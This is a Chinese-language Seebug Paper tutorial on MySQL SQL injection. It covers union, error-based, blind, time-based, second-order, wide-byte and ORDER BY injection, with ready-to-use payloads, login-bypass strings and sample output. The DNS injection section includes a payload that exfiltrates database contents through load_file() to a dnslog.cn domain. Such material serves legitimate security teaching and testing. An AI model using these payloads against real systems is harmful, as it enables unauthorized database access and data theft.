**作者： 啵啵  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：paper@seebug.org**

**注入攻击的本质，是把用户输入的数据当做代码执行。**

  * 这里有两个关键条件：

**第一个是用户能够控制输入**

**第二个是原本程序要执行的代码，拼接了用户输入的数据然后进行执行**

## 判断注入点

最古老的方法

  * and 1=1 页面正常
  * and 1=2 页面不正常

最简单的方法

  * 页面后加 '，看是否报错
  * 如果是数字型传参，可以尝试-1

例如：

  * http://www.xxx.com/new.php?id=1 页面显示id=1的新闻
  * http://www.xxx.com/new.php?id=2-1 页面显示id=1的新闻

**and 1=1 and 1=2 被拦截的可能性太高了，可以尝试 and -1=-1 and -1=-2 and 1 >0 or 1=1。**

**或者直接 or sleep(5)**

## 常用函数

查看当前数据库版本

  * VERSION()
  * @@VERSION
  * @@GLOBAL.VERSION

查看数据库当前登陆用户

  * USER()
  * CURRENT_USER()
  * SYSTEM_USER()
  * SESSION_USER()

当前使用的数据库

  * DATABASE()
  * SCHEMA()

系统相关

  * @@BASEDIR : mysql安装路径：
  * @@SLAVE_LOAD_TMPDIR : 临时文件夹路径：
  * @@DATADIR : 数据存储路径：
  * @@CHARACTER_SETS_DIR : 字符集设置文件路径
  * @@LOG_ERROR : 错误日志文件路径：
  * @@PID_FILE : pid-file文件路径
  * @@BASEDIR : mysql安装路径：
  * @@SLAVE_LOAD_TMPDIR : 临时文件夹路径：
  * @@version_compile_os:操作系统版本:

注释

  * \-- qwe(有一个空格)
  * # 

## 联合数据

    
    
    concat()
    group_concat()
    concat_ws()

### CIBCAT

基本格式

    
    
    CONCAT(str1,str2)

返回结果为连接参数产生的字符串。如有任何一个参数为 NULL ，则返回值为 NULL。可以有一个或多个参数。

**参数中有 NULL**

    
    
    mysql> SELECT CONCAT(id,',',NULL,',',password) AS users FROM users LIMIT 1,1;
    +-------+
    | users |
    +-------+
    | NULL  |
    +-------+
    1 row in set (0.00 sec)

**使用 LIMIT 来控制结果数量**

    
    
    mysql> SELECT CONCAT(id,',',username,',',password) AS users FROM users LIMIT 1;  
    +-------------+                                                                  
    | users       |                                                                  
    +-------------+                                                                  
    | 1,Dumb,Dumb |                                                                  
    +-------------+                                                                  
    1 row in set (0.00 sec)         
    
    mysql> SELECT CONCAT(id,',',username,',',password) AS users FROM users LIMIT 2;  
    +-----------------------+                                                        
    | users                 |                                                        
    +-----------------------+                                                        
    | 1,Dumb,Dumb           |                                                        
    | 2,Angelina,I-kill-you |                                                        
    +-----------------------+     
    2 rows in set (0.00 sec)
    
    mysql> SELECT CONCAT(id,',',username,',',password) AS users FROM users LIMIT 0,1;
    +-------------+                                                                  
    | users       |                                                                  
    +-------------+                                                                  
    | 1,Dumb,Dumb |                                                                  
    +-------------+                                                                  
    1 row in set (0.00 sec)           
    
    mysql> SELECT CONCAT(id,',',username,',',password) AS users FROM users LIMIT 0,2;
    +-----------------------+                                                        
    | users                 |                                                        
    +-----------------------+                                                        
    | 1,Dumb,Dumb           |                                                        
    | 2,Angelina,I-kill-you |                                                        
    +-----------------------+                                                        
    2 rows in set (0.00 sec)     
    
    mysql> SELECT CONCAT(id,',',username,',',password) AS users FROM users LIMIT 1,1;
    +-----------------------+                                                        
    | users                 |                                                        
    +-----------------------+                                                        
    | 2,Angelina,I-kill-you |                                                        
    +-----------------------+                                                        
    1 row in set (0.00 sec)         

### CONCAT_WS

`CONCAT_WS()` 代表 `CONCAT With Separator`
，是`CONCAT()`的特殊形式。第一个参数是其它参数的分隔符。这样参数多的话就不用手动的去添加分隔符了。

基本格式

    
    
    CONCAT_WS(separator,str1,str2,…)

Separator 为字符之间的分隔符

    
    
    mysql> SELECT CONCAT_WS('~',id,username,password) AS users FROM users LIMIT 0,2;
    +-----------------------+                                                       
    | users                 |                                                       
    +-----------------------+                                                       
    | 1~Dumb~Dumb           |                                                       
    | 2~Angelina~I-kill-you |                                                       
    +-----------------------+                                                       
    2 rows in set (0.00 sec)                                                        

### GROUP_CONCAT

基本格式

    
    
    GROUP_CONCAT(str1,str2,…)
    
    
    mysql> SELECT GROUP_CONCAT(id,username,password) AS users FROM users; 
    +--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ 
    | users | +--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ 
    | 1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4 
    | +--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ 
    1 row in set (0.00 sec)

# 显错注入

Mysql在5.0以上版本加入了 information_schema 这个系统自带库
其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等

  * **information_schema.tables 存放表名和库名的对应**

  * **information_schema.columns 存放字段名和表名的对应**

注: **information_schema.tables 实际上是选中information_schema库中的tables表**

## 基本流程

### 判断字段数目

    
    
    ORDER BY 10 
    
    ORDER BY 5  
    
    ORDER BY 2  
    
    ....

### 判断显示位

    
    
    union select 1,2,3,4,5,6,7……

### 查看当前数据库

    
    
    union select 1,2,database()

### 查表名

    
    
    union select 1,2,table_name from information_schema.tables where 
    table_schema=database() 

### 查列名

    
    
    union select 1,2,column_name from information_schema.columns where 
    table_name='表名' and table_schema=database() 

### 查询字段值

    
    
    union select 1,字段名,字段名 from 表名

# POST注入

POST注入就是使用POST进行传参的注入，本质上和GET类型的没什么区别

POST注入高危点

  * 登录框
  * 查询框
  * 等各种和数据库有交互的框

## 万能密码

    
    
    'or 1=1-- qwe
    'or 1=1#
    admin'-- qwe
    admin'#

# 报错注入

## floor()报错

### 原理

floor()报错注入的原因是group
by在向临时表插入数据时，由于rand()多次计算导致插入临时表时主键重复，从而报错，又因为报错前concat()中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果。

### 报错语句

    
    
    mysql> select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));
    ERROR 1062 (23000): Duplicate entry '5.5.54-log1' for key 'group_key'
    
    mysql> select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;
    ERROR 1062 (23000): Duplicate entry '5.5.54-log1' for key 'group_key'
    
    mysql> select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a;
    ERROR 1062 (23000): Duplicate entry '5.5.54-log1' for key 'group_key'

### 关键表被禁用了

    
    
    select count(*) from (select 1 union select null union select !1)x group by concat(database(),floor(rand(0)*2)) 

## xpath语法报错

**updatexml()** 更新xml文档的函数

语法：updatexml(目标xml内容，xml文档路径，更新的内容)

    
    
    and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)

实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了

但是报错的时候他其实已经执行了那个子查询代码！

[0x7e 实际是是16进制，Mysql支持16进制，但是开头得写0x 0x7e是一个特殊符号，然后不符合路径规则报错] ~ ~

**extractvalue()**

语法: extractvalue(目标xml内容，xpath格式的字符串)

    
    
    and extractvalue(1,concat(0x7e,(SELECT database()),0x7e))

**updatexml与extractvalue都是基于xpath语法进行报错的,extractvalue也与其类似。**

**一般是配合and或者是or使用的，他和联合查询不同，不需要在意什么字段数。**

## exp报错

### 原理

exp是一个数学函数 取e的x次方，当我们输入的值大于709就会报错
然后取反它的值总会大于709所以报错，适用版本：5.5.5，5.5.49，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错，~符号为运算符，意思为一元字符反转。

### 报错语句

**这里必须使用嵌套，因为不使用嵌套不加select*from 无法大整数溢出**

    
    
    exp(~(select * from(查询语句)a))
    
    union select exp(~(select * from(select database())a))

## BIGINT溢出错误

### 报错语句

    
    
    !(select*from(select user())x)-~0
    
    (select(!x-~0)from(select(select user())x)a)
    
    (select!x-~0.from(select(select user())x)a)

## 几何函数报错

### 报错语句

    
    
    GeometryCollection：GeometryCollection((select * from (select* from(select user())a)b))
    
    polygon()：polygon((select * from(select * from(select user())a)b))
    
    multipoint()：multipoint((select * from(select * from(select user())a)b))
    
    multilinestring()：multilinestring((select * from(select * from(select user())a)b))
    
    linestring()： LINESTRING((select * from(select * from(select user())a)b))
    
    multipolygon() ：multipolygon((select * from(select * from(select user())a)b))

# 盲注

## 介绍

布尔盲注

  * 布尔有明显的True跟Flase，也就是说它会根据你的注入信息返回Ture跟Flase，也就没有了之前的报错信息.

时间盲注

  * 页面返回值只有一种Ture，无论输入认识值，返回情况都会按正常来处理.加入特定的时间函数，通过web页面返回的时间差来判断注入语句是否正确。

### 盲注常用函数

  * **length()** 函数 返回字符串的长度
  * **substr()** 截取字符串 （语法:SUBSTR(str,pos,len);） 
  * **scii()** 返回字符的ascii码 [将字符变为数字wei]
  * **sleep()** 将程序挂起一段时间n为n秒
  * **if(expr1,expr2,expr3)** 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句 

## 注入流程

### 盲注

猜解当前数据库名称长度

    
    
    and (length(database()))>1

利用ASCII码猜解当前数据库名称

    
    
    and (ascii(substr(database(),1,1)))=115
    --返回正常，说明数据库名称第一位是s

猜表名

    
    
    and (ascii(substr((select table_name from information_schema.tables where 
    table_schema=database() limit 0,1),1,1)))=101
    --返回正常，说明数据库表名的第一个的第一位是e

猜字段名

    
    
    and (ascii(substr((select column_name from information_schema.columns where 
    table_name='zkaq' limit 0,1),1,1)))=102
    --返回正常，说明zkaq表中的列名称第一位是f

猜内容

    
    
    and (ascii(substr(( select zKaQ from zkaq limit 4,1),1,1)))=122
    --返回正常，说明zKaQ列第一位是z

### 延时注入

    
    
    and if(ascii(substr(database(),1,1))>1,0,sleep(5))

**延时盲注其实和布尔盲注其实没有什么太大的区别，只不过是一个依靠页面是否正常判断，一个是否延时判断，在操作上其实也差不多，只不过延时多一个if()**

# 二次注入

## 原理

黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL
语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。

## 案例

    
    
    UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'

这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username
的值为：`admin'#`，那么此时的完整语句就为：sql

    
    
    UPDATE users SET PASSWORD='$pass' where username='admin'# and password='$curr_pass'

此时就完全改变了语义，直接就修改掉了 admin 用户的密码。

## 步骤

创建一个`admin'#`开头的用户名:

    
    
    admin'#1
    admin'#233
    admin'#gg
    ...

注册完成后数据库的记录信息如下

    
    
    mysql> select * from users;
    +----+---------------+------------+
    | id | username      | password   |
    +----+---------------+------------+
    | 20 | admin'#hacker | 111        |
    +----+---------------+------------+

成功添加了记录，这里单引号数据库中中看没有被虽然转义了，这是因为转义只不过是暂时的，最后存入到数据库的时候还是没变的。

接下来登录 `admin'#hacker` 用户，然后来修改当前的密码

此时来数据库中查看，可以发现成功修改掉了 admin 用的密码了：

    
    
    mysql> select * from users;
    +----+---------------+------------+
    | id | username      | password   |
    +----+---------------+------------+
    |  8 | admin         | 233        |
    | 20 | admin'#hacker | 111        |
    +----+---------------+------------+

# 宽字节注入

**宽字节注入原理**

MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 `%aa%5c` 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠
`\。

宽字节注入就是PHP发送请求到MySql时使用了语句

SET NAMES 'gbk' 或是SET character_set_client =gbk
进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节注入。

1 %df`吃掉``

具体的原因是 `urlencode(\') = %5c%27`，我们在`%5c%27` 前面添加`%df`，形 成`%df%5c%27`，MySQL 在
GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把`%df%5c` 当做是一个汉字，`%27`
则作为一个单独的符号在外面，同时也就达到了我们的目的。

2 将 `\'` 中的 `\` 过滤掉

例如可以构造 `%5c%5c%27` 的情况，后面的`%5c`会被前面的`%5c` 给注释掉。这也是 bypass 的一种方法。

## post型

将 utf-8 转换为 utf-16 或 utf-32，例如将 `'` 转为 utf-16 为`�`

我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：

    
    
    ➜  ~ echo \'|iconv -f utf-8 -t utf-16
    ��'
    ➜  ~ echo \'|iconv -f utf-8 -t utf-32
    ��'

**其他情况**

  1. UTF-8是3个字符
  2. GBK是2个字符
  3. \是1个字符

外面传参一个汉字UTF-8（3个字符）

进了数据库GBK3+1=4 >这是两个汉字

    
    
    汉') or 1=1-- qwe

**有的时候我们也可以用16进制来代替字符串**

# DNS注入

## dnslog的使用场景

在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起请求，这个时候就可以通过DNS请求把想获得的数据外带出来。

对于sql盲注，常见的方法就是二分法去一个个的猜，但是这样的方法麻烦不说，还很容易因为数据请求频繁导致被ban。

所以可以将select到的数据发给一个url，利用dns解析产生的记录日志来查看数据。

## load_file()

load_file(file_name):读取一个文件并将其内容作为字符串返回

语法

**load_file(file_name)**

其中file_name是文件的完整路径。

条件

  1. 文件必须位于服务器主机上
  2. 必须指定完整路径的文件
  3. 必须要file权限，所有字节可读。

如果文件不存在或者无法读取，因为前面条件之一不满足，函数返回NULL。(这个功能不是默认开启的需要在mysql配置中加一句secure_file_priv=)

## UNC路径

UNC（ **U** niversal **N** aming **C** onvention）通用命名规则，也叫通用命名规范、通用命名约定。
网络（主要指局域网）上资源的完整名称。 它符合\servername\sharename 格式，其中 **servername** 是服务器名，
**sharename** 是共享资源的名称。 目录或文件的 UNC
名称可以包括共享名称下的目录路径，格式\servername\sharename\directory\filename。

unc共享就是指网络硬盘的共享

我们熟悉的命令行访问法访问网上邻居，实际上应该称作UNC路径访问法。

**不过UNC路径也可以这样写//servername/sharename {建议这样写}**

例子

  * \\().zkaq.cn\abc => 我们通过SMB服务取请求a.zkaq.cn那台机器下的abc文件夹

## DNS注入原理

语句

    
    
    and (select load_file(concat('//',(select database()),'.3zgwqy.dnslog.cn/ddd')))

通过子查询，将内容拼接到域名内，让 **load_file()** 去访问共享文件，访问的域名被记录

此时变为显错注入,将盲注变显错注入,读取远程共享文件，通过拼接出函数做查询,拼接到域名中，访问时将访问服务器，记录后查看日志.

# order by注入

**order by 不同于 where 后的注入点，不能使用 union 等进行注入**

### 验证方式

  * **升序和降序验证**

    
    
    # 升序排序
    ?sort=1 asc
    
    # 降序排序
    ?sort=1 dasc

  * **rand() 验证**

rand(ture) 和 rand(false) 的结果是不一样的

    
    
    ?sort=rand(true)
    ?sort=rand(false)

  * **延时验证**

    
    
    ?sort=sleep(1)
    ?sort=(sleep(1))
    ?sort=1 and sleep(1)

这种方式均可以延时，延时的时间为 (行数*1) 秒

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1665/>

